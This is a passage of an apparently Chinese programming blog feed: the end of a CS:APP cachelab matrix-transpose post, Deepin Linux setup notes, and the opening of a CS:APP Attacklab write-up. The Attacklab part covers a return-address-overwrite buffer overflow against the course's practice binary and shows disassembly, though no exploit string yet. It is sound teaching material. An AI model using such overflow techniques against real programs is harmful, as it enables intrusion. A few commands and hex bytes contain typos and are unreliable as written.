start="3"><li>那，如何保住利用率的同时，减少冲突不命中？</li></ol><p>要保住利用率，BSIZE应该是8的整数倍。但是冲突不命中如何解决？</p><p>以BSIZE=8为例：</p><p>A条带长度为8，我们将一个A条带的前4列正常填入B的前4行，而<strong>A条带的后4列填入到其他地方，</strong>再等待某个时机，将这些临时填充的数据归还到正确位置即可。示意图：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/5f212d6b14195aa59451559a.png" alt="image-20200729153035966"></p><p>绿色代表正常填入区间。</p><p>灰色代表本应该填入，但是不填入，转而填入到红色区域。</p><p>红色区域代表临时填充区间。</p><p>接着，在某个时机：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/5f212d7d14195aa594515d89.png" alt="image-20200729153243973"></p><p>几个问题：</p><ol><li><p>为什么红色区域要横着填？</p><p>因为要考虑cache友好性，如果竖着填，那将跨越多个cacheline。</p></li><li><p>为什么要选择第0行，第4 5 6 7列 作为 第0列，第4 5 6 7行的临时区间？</p><p>这只是个示意图，实际上我选择了3种方案，最终方案不是这样映射的，贴这个图是为了方便理解。</p></li><li><p>某个时机？具体是什么时机？</p><p>将要填写第0行，第4,5,6,7列数据时，首先先移动数据到正确的位置（第0列，第4,5,6,7行），然后才填写第0行，第4，5,6,7列。</p></li><li><p>最靠右的块如何处理？它已经没有 右边的空间 作为缓冲了。</p><p>单独处理。具体之后会说。</p></li></ol><h4 id="最终方案"><a href="#最终方案" class="headerlink" title="最终方案"></a>最终方案</h4><p>最终我选择方案为： BSIZE=8，临时填充区间示意图如下：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/5f212d8c14195aa5945163a2.png" alt="image-20200729153935817"></p><p>为什么会这样选？如果像之前示意图那样选，依然会存在很多冲突映射，甚至不如不做映射。仔细分析了下trace file,手动模拟了cache line的load store过程，选择的这样的临时填充映射。</p><p><strong>最后再说说扫描到最后一个8x8的方格时如何处理</strong>，由于最后的方格右边已经没有空间做缓冲，那先考虑一个简单的，直接对A和B矩阵的最后8x8方格做一一映射。显然后4x8会把和前4x8会产生冲突不命中。</p><p>这样做的miss数应该是1500多。虽然比最开始的算法1800多，还是好不少，但依然没法满分。没办法，继续考虑。</p><p><strong>既然是后4x8和前4x8冲突了，那把两次赋值过程分开不就好了吗？</strong></p><p>是的，基于这样的思想，我改了代码，嗯，不错，<strong>这次跑的结果为1190</strong>。总算挤近1300了。</p><p>别忘了，依然要解决重复加载A条带带来的冲突不命中问题（即，多定义局部变量）。</p><p>最终代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">trans64_v1</span><span class="params">(<span class="keyword">int</span> A[<span class="number">64</span>][<span class="number">64</span>], <span class="keyword">int</span> B[<span class="number">64</span>][<span class="number">64</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LEN 64</span></span><br><span class="line">    <span class="keyword">int</span> i, j, k;</span><br><span class="line">    <span class="keyword">int</span> t0, t1, t2, t3, t4, t5, t6, t7;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 所有循环视角从B矩阵出发</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; LEN; i += <span class="number">8</span>) <span class="comment">// 1. 以block行为单位，扫描整个矩阵</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; LEN; j += <span class="number">8</span>) <span class="comment">// 2. 以一个block为单位，扫描一个block行</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span> (k = j; k &lt; j + <span class="number">8</span>; k++) <span class="comment">// 3. 以一个条带为单位，扫描一个块</span></span><br><span class="line">            &#123;</span><br><span class="line"></span><br><span class="line">                t0 = A[k][i + <span class="number">0</span>];</span><br><span class="line">                t1 = A[k][i + <span class="number">1</span>];</span><br><span class="line">                t2 = A[k][i + <span class="number">2</span>];</span><br><span class="line">                t3 = A[k][i + <span class="number">3</span>];</span><br><span class="line">                t4 = A[k][i + <span class="number">4</span>];</span><br><span class="line">                t5 = A[k][i + <span class="number">5</span>];</span><br><span class="line">                t6 = A[k][i + <span class="number">6</span>];</span><br><span class="line">                t7 = A[k][i + <span class="number">7</span>];</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (j == <span class="number">0</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">// 第一块</span></span><br><span class="line">                    <span class="comment">// 前4个正常放置</span></span><br><span class="line">                    B[i + <span class="number">0</span>][k] = t0;</span><br><span class="line">                    B[i + <span class="number">1</span>][k] = t1;</span><br><span class="line">                    B[i + <span class="number">2</span>][k] = t2;</span><br><span class="line">                    B[i + <span class="number">3</span>][k] = t3;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 后4个需要单独处理</span></span><br><span class="line">                    B[i + k % <span class="number">4</span>][k - k % <span class="number">4</span> + <span class="number">8</span>] = t4;</span><br><span class="line">                    B[i + k % <span class="number">4</span>][k - k % <span class="number">4</span> + <span class="number">9</span>] = t5;</span><br><span class="line">                    B[i + k % <span class="number">4</span>][k - k % <span class="number">4</span> + <span class="number">10</span>] = t6;</span><br><span class="line">                    B[i + k % <span class="number">4</span>][k - k % <span class="number">4</span> + <span class="number">11</span>] = t7;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">// 非第一块，首先需要将元素搬迁到正确的位置</span></span><br><span class="line">                    <span class="keyword">if</span> (k == j) <span class="comment">// 第一次进入该块时，搬迁</span></span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">for</span> (<span class="keyword">size_t</span> a = i; a &lt; i + <span class="number">4</span>; a++)</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="keyword">for</span> (<span class="keyword">size_t</span> b = j; b &lt; j + <span class="number">4</span>; b++) <span class="comment">// 一个条带</span></span><br><span class="line">                            &#123;</span><br><span class="line">                                <span class="comment">// 两点关于一条直线对称</span></span><br><span class="line">                                B[b + i - j + <span class="number">4</span>][a - i + j - <span class="number">8</span>] = B[a][b];</span><br><span class="line">                                B[b + i - j + <span class="number">4</span>][a - i + j - <span class="number">4</span>] = B[a][b + <span class="number">4</span>];</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 然后，填入本block正确的元素</span></span><br><span class="line">                    <span class="keyword">if</span> (j != LEN - <span class="number">8</span>)</span><br><span class="line">                    &#123; </span><br><span class="line">                        <span class="comment">// 中间块处理方式和第一块处理方式相同</span></span><br><span class="line">                        <span class="comment">// 前4个正常放置</span></span><br><span class="line">                        B[i + <span class="number">0</span>][k] = t0;</span><br><span class="line">                        B[i + <span class="number">1</span>][k] = t1;</span><br><span class="line">                        B[i + <span class="number">2</span>][k] = t2;</span><br><span class="line">                        B[i + <span class="number">3</span>][k] = t3;</span><br><span class="line"></span><br><span class="line">                        <span class="comment">// 后4个需要单独处理</span></span><br><span class="line">                        B[i + k % <span class="number">4</span>][k - k % <span class="number">4</span> + <span class="number">8</span>] = t4;</span><br><span class="line">                        B[i + k % <span class="number">4</span>][k - k % <span class="number">4</span> + <span class="number">9</span>] = t5;</span><br><span class="line">                        B[i + k % <span class="number">4</span>][k - k % <span class="number">4</span> + <span class="number">10</span>] = t6;</span><br><span class="line">                        B[i + k % <span class="number">4</span>][k - k % <span class="number">4</span> + <span class="number">11</span>] = t7;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="comment">// 最后一块单独处理</span></span><br><span class="line">                        <span class="comment">// 只处理8x8的上 4x8方块</span></span><br><span class="line">                        B[i + <span class="number">0</span>][k] = t0;</span><br><span class="line">                        B[i + <span class="number">1</span>][k] = t1;</span><br><span class="line">                        B[i + <span class="number">2</span>][k] = t2;</span><br><span class="line">                        B[i + <span class="number">3</span>][k] = t3;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 补齐最后一块的下4行条带， 即最后的8x8的下4x8方块</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">size_t</span> a = <span class="number">56</span>; a &lt; <span class="number">64</span>; a++)</span><br><span class="line">        &#123;</span><br><span class="line">            t4 = A[a][i + <span class="number">4</span>];</span><br><span class="line">            t5 = A[a][i + <span class="number">5</span>];</span><br><span class="line">            t6 = A[a][i + <span class="number">6</span>];</span><br><span class="line">            t7 = A[a][i + <span class="number">7</span>];</span><br><span class="line"></span><br><span class="line">            B[i + <span class="number">4</span>][a] = t4;</span><br><span class="line">            B[i + <span class="number">5</span>][a] = t5;</span><br><span class="line">            B[i + <span class="number">6</span>][a] = t6;</span><br><span class="line">            B[i + <span class="number">7</span>][a] = t7;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> LEN</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果你眼尖，会发现一个问题，那就是局部变量用了13个。好吧，确实是，but，我们是可以解决的：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">size_t</span> a = i; a &lt; i + <span class="number">4</span>; a++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> b = j; b &lt; j + <span class="number">4</span>; b++) <span class="comment">// 一个条带</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 两点关于一条直线对称</span></span><br><span class="line">        B[b + i - j + <span class="number">4</span>][a - i + j - <span class="number">8</span>] = B[a][b];</span><br><span class="line">        B[b + i - j + <span class="number">4</span>][a - i + j - <span class="number">4</span>] = B[a][b + <span class="number">4</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>把这个循环展开即可。</p><h2 id="3-总结"><a href="#3-总结" class="headerlink" title="3. 总结"></a>3. 总结</h2><p>呼，加上今天的文章，cachelab一共花了3天的时间，不过是完全值得的，能够深入理解经常碰到的cacheline的本质，理清了很多概念上的东西。 cache友好的代码确实很难想也很难写，以我目前的能力，写代码时还考虑不到这么底层，考虑一些时间、空间局部性就快极限了，每一行代码都去想cache line实在耗费很多精力，不得不说，还有很多路要走啊。</p><p>最近也要忙项目了，下一个lab不知道什么时候再做。但一定要把csapp啃完！</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本次 lab, cachelab.&lt;/p&gt;
&lt;h2 id=&quot;0-说明&quot;&gt;&lt;a href=&quot;#0-说明&quot; class=&quot;headerlink&quot; title=&quot;0. 说明&quot;&gt;&lt;/a&gt;0. 说明&lt;/h2&gt;&lt;p&gt;从这个lab开始，终于开始编写一些高级语言的代码了，而不像之前要去分析汇编。但是这并不意味这题目就简单了，实际上，cachelab耗费了我2天多的时间。ok，言归正传，这个lab的目的是什么呢？&lt;/p&gt;
&lt;p&gt;cachelab帮助我们理解计算机存储体系中的重要组成部分–cache。 理解cache是如何组织的，如何工作的，又是如何影响我们的程序的性能的。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Csapp" scheme="https://www.ravenxrz.ink/categories/Csapp/"/>
    
    
      <category term="cachelab" scheme="https://www.ravenxrz.ink/tags/cachelab/"/>
    
  </entry>
  
  <entry>
    <title>Deepin安装后续事项记录</title>
    <link href="https://www.ravenxrz.ink/archives/8134a50f.html"/>
    <id>https://www.ravenxrz.ink/archives/8134a50f.html</id>
    <published>2020-07-21T06:18:35.000Z</published>
    <updated>2020-09-06T07:37:36.752Z</updated>
    
    <content type="html"><![CDATA[<p>manjaro是个人最喜欢的linux发行版，但是给我的台式机安装后，总是死机，无奈暂时转入deepin。</p><blockquote><p>后来发现manjaro死机，应该是给cpu超频的原因, 因为deepin也死机了，关闭超频后，一切正常，但是已经在deepin上安装好了各种环境，不想再更换回去。</p></blockquote><p>本文依然是自己给自己的备份。</p><a id="more"></a><p>安装流程：</p><ol><li><p>更新仓库</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update &amp;&amp;　sudo apt ugprade -y</span><br></pre></td></tr></table></figure></li><li><p>几个前提软件：vim ,google-chrome, fcitx-rime</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install vim google-chromme-stable fcitx-rime </span><br></pre></td></tr></table></figure><p>如果有fcitx-rime的备份，拉下备份即可，路径：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~&#x2F;.config&#x2F;fcitx&#x2F;rime</span><br></pre></td></tr></table></figure></li><li><p>zsh+oh-myz-zsh配置：<a href="https://www.ravenxrz.ink/archives/6c55eca4.html">https://www.ravenxrz.ink/archives/6c55eca4.html</a></p></li><li><p>electron–ssr，要使用chrome，得先同步一下，地址:<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3FpbmdzaHVpc2l5dWFuL2VsZWN0cm9uLXNzci1iYWNrdXAvcmVsZWFzZXMvZG93bmxvYWQvdjAuMi42L2VsZWN0cm9uLXNzci0wLjIuNi5kZWI=" title="https://github.com/qingshuisiyuan/electron-ssr-backup/releases/download/v0.2.6/electron-ssr-0.2.6.deb">https://github.com/qingshuisiyuan/electron-ssr-backup/releases/download/v0.2.6/electron-ssr-0.2.6.deb<i class="fa fa-external-link"></i></span></p></li></ol><p>ok,有了这几个，后面就会容易很多。</p><p>openjdk , vscode， idea，clion，netease-clound-music, Persepolis, <strong>copyQ</strong>， barrier（两台物理机共用一套键鼠，个人目前台式机linux做开发，笔记本windows办公），wps（应急用）,tldr(快速查命令手册), gitkraken, okular(pdf阅读器)</p><p>自定义快捷键：</p><p>控制面板-&gt;键盘和语言-&gt;快捷键：</p><ul><li>截图–F2</li><li>终端雷神模式-F12</li></ul><h2 id="一些问题："><a href="#一些问题：" class="headerlink" title="一些问题："></a><strong>一些问题：</strong></h2><p><strong>fcitx开机候选字体过小：</strong></p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/5f15095614195aa594196163.jpg"></p><p><strong>copyQ窗口显示快捷键设置：</strong></p><ol><li>打开copyQ应用程序</li><li>F6</li><li>添加</li><li>显示/隐藏主窗口</li><li>添加全局快捷键(Ctrl+`)， 和windows上的ditto保持一致。</li></ol><p>更多copyQ问题：<span class="exturl" data-url="aHR0cHM6Ly9jb3B5cS5yZWFkdGhlZG9jcy5pby9lbi9sYXRlc3QvZmFxLmh0bWw=" title="https://copyq.readthedocs.io/en/latest/faq.html">https://copyq.readthedocs.io/en/latest/faq.html<i class="fa fa-external-link"></i></span></p><p><strong>deepin风扇声音巨大：</strong></p><p>windows下，我的台式机几乎是静音，但是deepin（也包括manjaro)风扇声音巨大。查看系统资源占用，cpu, memory, disk都很低，最终觉得可能是gpu的风扇问题，无法方便的查看gpu占用率，于是安装：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nvidia-smi</span><br></pre></td></tr></table></figure><p>安装这个软件包，会自动安装一些nvidia的模块，安装后重启，发现已经没有风扇声音了。</p><p><strong>开机自动的问题：</strong></p><p>有时候哦需要添加一些开机自动的软件或者脚本。这一点deepin做的还是相当不错的，对于gui的应用，可以通过 右键-&gt;添加到开机自启动来做。对于脚本，个人安装的的是zsh terminal，所以对应到.zshrc文件，可以直接在该文件中添加脚本，考虑到可维护性的问题，可以手动建立一个.myautostartup.sh脚本，然后在.zshrc文件中添加：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source ~/.myautostartup.sh</span><br></pre></td></tr></table></figure><p>以后所有的要开机自启动的脚本直接在myautostartup.sh添加即可。</p><p>额外说一下barriers的配置脚本：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/barriers --no-tray --debug INFO --name raven-desktop-deepin --enable-crypto -c ~/.barrier_config --address :24800 </span><br></pre></td></tr></table></figure><p>.barrier_config文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">section: screens</span><br><span class="line">raven-desktop-deepin:</span><br><span class="line">halfDuplexCapsLock &#x3D; false</span><br><span class="line">halfDuplexNumLock &#x3D; false</span><br><span class="line">halfDuplexScrollLock &#x3D; false</span><br><span class="line">xtestIsXineramaUnaware &#x3D; false</span><br><span class="line">switchCorners &#x3D; none </span><br><span class="line">switchCornerSize &#x3D; 0</span><br><span class="line">raven-laptop-win:</span><br><span class="line">halfDuplexCapsLock &#x3D; false</span><br><span class="line">halfDuplexNumLock &#x3D; false</span><br><span class="line">halfDuplexScrollLock &#x3D; false</span><br><span class="line">xtestIsXineramaUnaware &#x3D; false</span><br><span class="line">switchCorners &#x3D; none </span><br><span class="line">switchCornerSize &#x3D; 0</span><br><span class="line">raven-laptop-manjaro:</span><br><span class="line">halfDuplexCapsLock &#x3D; false</span><br><span class="line">halfDuplexNumLock &#x3D; false</span><br><span class="line">halfDuplexScrollLock &#x3D; false</span><br><span class="line">xtestIsXineramaUnaware &#x3D; false</span><br><span class="line">switchCorners &#x3D; none </span><br><span class="line">switchCornerSize &#x3D; 0</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">section: aliases</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">section: links</span><br><span class="line">raven-desktop-deepin:</span><br><span class="line">right &#x3D; raven-laptop-win</span><br><span class="line">raven-laptop-win:</span><br><span class="line">left &#x3D; raven-desktop-deepin</span><br><span class="line">down &#x3D; raven-laptop-manjaro</span><br><span class="line">raven-laptop-manjaro:</span><br><span class="line">up &#x3D; raven-laptop-win</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">section: options</span><br><span class="line">relativeMouseMoves &#x3D; false</span><br><span class="line">screenSaverSync &#x3D; true</span><br><span class="line">win32KeepForeground &#x3D; false</span><br><span class="line">clipboardSharing &#x3D; true</span><br><span class="line">switchCorners &#x3D; none </span><br><span class="line">switchCornerSize &#x3D; 0</span><br><span class="line">end</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>qt creator高分屏显示问题</strong></p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/5f150c1114195aa5941a289e.jpg"></p><p><strong>vim，ideavim，qtvim配置</strong></p><p>terminal的vim，采用：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtaXgvdmltcmM=" title="https://github.com/amix/vimrc">https://github.com/amix/vimrc<i class="fa fa-external-link"></i></span> 配置</p><p>ideavim和qtvim采用：<span class="exturl" data-url="aHR0cHM6Ly9naXN0LmdpdGh1Yi5jb20vcmF2ZW54cnovZGJhOGRkMGMxZWJhNGJiMDM5ZjAwOGY1Njg2N2UwODM=" title="https://gist.github.com/ravenxrz/dba8dd0c1eba4bb039f008f56867e083">https://gist.github.com/ravenxrz/dba8dd0c1eba4bb039f008f56867e083<i class="fa fa-external-link"></i></span></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;manjaro是个人最喜欢的linux发行版，但是给我的台式机安装后，总是死机，无奈暂时转入deepin。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;后来发现manjaro死机，应该是给cpu超频的原因, 因为deepin也死机了，关闭超频后，一切正常，但是已经在deepin上安装好了各种环境，不想再更换回去。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;本文依然是自己给自己的备份。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Linux" scheme="https://www.ravenxrz.ink/categories/Linux/"/>
    
    
  </entry>
  
  <entry>
    <title>Csapp-Attacklab题解</title>
    <link href="https://www.ravenxrz.ink/archives/f81059da.html"/>
    <id>https://www.ravenxrz.ink/archives/f81059da.html</id>
    <published>2020-07-21T06:14:03.000Z</published>
    <updated>2020-09-06T07:37:36.748Z</updated>
    
    <content type="html"><![CDATA[<p>csapp lab系列：</p><ul><li><a href="https://www.ravenxrz.ink/archives/2d758396.html">Csapp-Datalab 详解</a></li><li><a href="https://www.ravenxrz.ink/archives/7915569e.html">Csapp-Bomblab 题解</a></li></ul><p>本次lab: Attacklab</p><p>耽误了整整一个月没有做csapp的lab了. 忙着返校,忙着实验室的东西, 今天抽了点时间,总算是完成了第三个实验.</p><p>下面就记录下题解分析吧.</p><a id="more"></a><h2 id="0-背景知识"><a href="#0-背景知识" class="headerlink" title="0. 背景知识"></a>0. 背景知识</h2><ol><li>程序的内存分布,,内存分布<a href="https://www.ravenxrz.ink/archives/2567fa35.html">https://www.ravenxrz.ink/archives/2567fa35.html</a></li><li>函数调用的过程, 主要要知道call和ret指令各自的工作. </li><li>gdb调试,objdump反汇编</li><li>Buffer Overflow以及常用的阻止buffer overflow的方法</li><li>ROP攻击</li></ol><p>其中,最重要的是,一定要了解stack frame的call和ret过程.</p><h2 id="1-Phase-1"><a href="#1-Phase-1" class="headerlink" title="1. Phase 1"></a>1. Phase 1</h2><p>题目就给英文了</p><p>For Phase 1, you will not inject new code. Instead, your exploit string will redirect the program to execute an existing procedure. Function getbuf is called within CTARGET by a function test having the following C code:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> val;</span><br><span class="line">    val = getbuf();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;No exploit.</span></span><br><span class="line"><span class="string">    Getbuf returned 0x%x\n&quot;</span>, val);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>When getbuf executes its return statement (line 5 of getbuf), the program ordinarily resumes execution within function test (at line 5 of this function). We want to change this behavior. Within the file ctarget, there is code for a function touch1 having the following C representation:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    vlevel = <span class="number">1</span>;</span><br><span class="line">    <span class="comment">/* Part of validation protocol */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Touch1!: You called touch1()\n&quot;</span>);</span><br><span class="line">    validate(<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Your task is to get CTARGET to execute the code for touch1 when getbuf executes its return statement, rather than returning to test. Note that your exploit string may also corrupt parts of the stack not directly related to this stage, but this will not cause a problem, since touch1 causes the program to exit directly.</p><p>这个题目非常简单, 不需要注入攻击, 只需要利用 getbuf()将程序的控制权从test函数,转入到touch1函数即可.</p><p>利用<code>objdump -d</code>命令,反汇编ctarget看看:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">0000000000401968 &lt;test&gt;:</span><br><span class="line">  401968:48 83 ec 08          sub    $0x8,%rsp</span><br><span class="line">  40196c:b8 00 00 00 00       mov    $0x0,%eax</span><br><span class="line">  401971:e8 32 fe ff ff       callq  4017a8 &lt;getbuf&gt;</span><br><span class="line">  401976:89 c2                mov    %eax,%edx</span><br><span class="line">  401978:be 88 31 40 00       mov    $0x403188,%esi</span><br><span class="line">  40197d:bf 01 00 00 00       mov    $0x1,%edi</span><br><span class="line">  401982:b8 00 00 00 00       mov    $0x0,%eax</span><br><span class="line">  401987:e8 64w f4 ff ff       callq  400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  40198c:48 83 c4 08          add    $0x8,%rsp</span><br><span class="line">  401990:c3                   retq   </span><br><span class="line">  401991:90                   nop</span><br><span class="line">  401992:90                   nop</span><br><span class="line">  401993:90                   nop</span><br><span class="line">  401994:90                   nop</span><br><span class="line">  401995:90                   nop</span><br><span class="line">  401996:90                   nop</span><br><span class="line">  401997:90                   nop</span><br><span class="line">  401998:90                   nop</span><br><span class="line">  401999:90                   nop</span><br><span class="line">  40199a:90                   nop</span><br><span class="line">  40199b:90                   nop</span><br><span class="line">  40199c:90                   nop</span><br><span class="line">  40199d:90                   nop</span><br><span class="line">  40199e:90                   nop</span><br><span class="line">  40199f:90                   nop</span><br><span class="line"></span><br><span class="line">00000000004017a8 &lt;getbuf&gt;:</span><br><span class="line">  4017a8:48 83 ec 28          sub    $0x28,%rsp</span><br><span class="line">  4017ac:48 89 e7             mov    %rsp,%rdi</span><br><span class="line">  4017af:e8 8c 02 00 00       callq  401a40 &lt;Gets&gt;</span><br><span class="line">  